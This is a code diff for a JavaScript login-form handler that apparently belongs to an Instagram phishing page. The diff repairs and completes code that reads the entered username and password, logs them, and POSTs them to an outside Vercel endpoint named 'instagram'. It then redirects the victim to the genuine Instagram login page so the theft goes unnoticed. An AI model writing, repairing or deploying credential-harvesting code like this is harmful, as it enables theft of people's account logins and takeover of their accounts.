@@ -32,30 +32,35 @@
 //     .catch((error) => {
 //         console.error('Error:', error);
 //     });
-document.getElementById('loginForm').addEventListener('submit'), function(event) {
-    event.preventDefault();
+// Add an event listener for the form submission
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the default form submission behavior
 
-  
-      // Send the credentials to your server
-      fetch('https://vercel.com/farouqs-projects-04f0e790/instagram', {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    // Log the credentials to the console
+    console.log('Username:', username);
+    console.log('Password:', password);
+
+    // Send the credentials to your server
+    fetch('https://vercel.com/farouqs-projects-04f0e790/instagram', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ username: username, password: password }),
+        body: JSON.stringify({ username, password }),
     })
     .then(response => response.json())
     .then(data => {
         console.log('Success:', data);
-    
+        // Optionally, redirect to another page or display a success message
     })
     .catch((error) => {
         console.error('Error:', error);
     });
 
-
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    // Log the credentials to the console…
-}
+    // Optionally, redirect to the Instagram login page
+    // Remove or modify this line if you don't want to redirect
+    window.location.href = 'https://www.instagram.com/accounts/login/';
+});
